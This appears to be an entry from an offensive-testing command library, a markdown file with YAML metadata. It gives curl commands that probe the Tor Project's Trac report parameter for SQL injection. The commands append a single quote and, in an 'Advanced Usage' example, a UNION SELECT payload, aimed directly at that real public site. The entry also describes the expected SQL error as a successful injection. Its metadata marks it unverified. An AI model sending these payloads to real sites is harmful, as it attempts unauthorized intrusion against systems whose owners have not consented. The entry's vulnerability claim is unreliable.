---
id: cmd-uuid-001
data: >-
  curl "https://trac.torproject.org/projects/tor/query?status=closed&report=1'"
  -v
tags:
  - sqli
  - web-test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.306Z'
verified: false
validated: true
submitted: true
---
# curl-test-sqli-report

## Command

```bash
curl "https://trac.torproject.org/projects/tor/query?status=closed&report=1'" -v
```

## Description

This command tests for SQL Injection in the Trac report parameter by sending a GET request with an appended single quote to trigger a syntax error in the backend SQL query.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The target Trac query endpoint with injected payload | Yes |
| -v | Verbose output to show request/response details | No |

## Examples

### Basic Usage

```bash
curl "https://trac.torproject.org/projects/tor/query?status=closed&report=1'" -v
```

### Advanced Usage

```bash
curl "https://trac.torproject.org/projects/tor/query?status=closed&report=1' UNION SELECT 1--" -v
```

## Expected Output

A response with HTTP status 200 or 500, body containing SQL error like "SQL syntax error near '1''", indicating successful injection trigger.

## Related

- [[Related Procedure|procedures/Trigger-SQL-Injection-in-Trac-Report-Parameter]]
